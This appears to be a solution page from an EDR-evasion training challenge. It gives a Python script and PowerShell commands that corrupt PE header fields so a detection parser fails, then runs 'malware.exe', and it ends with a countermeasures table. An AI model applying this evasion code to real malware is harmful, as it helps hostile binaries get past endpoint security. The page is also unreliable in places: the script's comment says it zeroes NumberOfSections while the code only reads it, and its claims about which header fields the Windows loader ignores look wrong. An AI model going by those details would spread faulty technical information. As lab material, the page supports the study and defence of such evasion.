---
title: "Solution 35: PE Header Obfuscation (Astral-PE)"
difficulty: hard
category: "Packer & PE Evasion"
---

[Back to Challenge]({{ '/challenges/35-pe-header-obfuscation/' | relative_url }})

## Overview

PE header obfuscation tools like [Astral-PE](https://github.com/DosX-dev/Astral-PE) corrupt or manipulate PE header fields that third-party parsers rely on but the Windows PE loader ignores, causing the EDR's parser to bail out before finding anything suspicious.

## Solution

```powershell
# Option 1: Use Astral-PE
git clone https://github.com/DosX-dev/Astral-PE.git
cd Astral-PE
dotnet build
.\Astral-PE.exe -f packed.exe

# Option 2: Manual header corruption with Python
```

```python
# pe_header_obfuscate.py
import struct, sys

with open(sys.argv[1], 'rb') as f:
    data = bytearray(f.read())

# Get e_lfanew
e_lfanew = struct.unpack_from('<I', data, 0x3C)[0]

# Technique 1: Zero out NumberOfSections in COFF header
# The Windows loader reads SizeOfImage instead for mapping,
# but the EDR parser loops over NumberOfSections
# CAUTION: This may break some binaries — test carefully
coff_offset = e_lfanew + 4
original_sections = struct.unpack_from('<H', data, coff_offset + 2)[0]
print(f"Original NumberOfSections: {original_sections}")

# Technique 2: Set SizeOfOptionalHeader to a huge value
# The EDR calculates section header offset as:
#   coffHeaderStart + 20 + sizeOfOptionalHeader
# A large value pushes section headers past EOF
size_opt_offset = coff_offset + 16
struct.pack_into('<H', data, size_opt_offset, 0xFFFF)
print("Set SizeOfOptionalHeader to 0xFFFF")

# Technique 3: Corrupt Rich header (between DOS stub and PE sig)
# Many parsers trip on unexpected data here
dos_stub_end = 0x80  # typical end of DOS stub
for i in range(dos_stub_end, e_lfanew):
    data[i] = 0x00  # zero out Rich header
print(f"Zeroed {e_lfanew - dos_stub_end} bytes of Rich header")

with open(sys.argv[1], 'wb') as f:
    f.write(data)

print("Header obfuscation applied")
```

```powershell
# Apply obfuscation
python pe_header_obfuscate.py malware.exe

# Run — the EDR parser fails silently, Rule 9 returns nothing
.\malware.exe
```

## Why It Works

The EDR's PE parser is strict and sequential:

```nim
proc analyzePeStructure(imagePath: string): PeAnalysis =
  result = PeAnalysis(valid: false, ...)     # default: invalid

  # Any of these failing causes early return with valid=false:
  if dosHeader[0] != 0x4D or dosHeader[1] != 0x5A: return
  if eLfaNew <= 0 or eLfaNew > 1024 * 1024: return
  if peData[0] != ord('P') or ... : return
  ...
  # If sections can't be read: break (incomplete analysis)
```

The Windows PE loader is far more lenient — it only needs:
- Valid MZ signature
- Valid PE signature at `e_lfanew`
- Correct `ImageBase`, `SizeOfImage`, `AddressOfEntryPoint`
- Section mappings (uses RVA, not names)

Fields the EDR relies on but the loader ignores:
- `NumberOfSections` (loader uses `SizeOfImage` for mapping)
- `SizeOfOptionalHeader` (loader reads a fixed size based on PE32/PE32+)
- Rich header (completely informational)
- Section names (loader uses RVA and characteristics)

## Countermeasures

| Defense | What It Does |
|---------|-------------|
| Resilient PE parser | Handle malformed headers gracefully, flag parsing failures as suspicious |
| Minimum section count check | Binaries with 0 parseable sections are suspicious |
| Parser failure = alert | If PE parsing fails on a running binary, that's an anomaly worth flagging |
| Memory-mapped parsing | Parse the PE as the OS loaded it, not from disk |
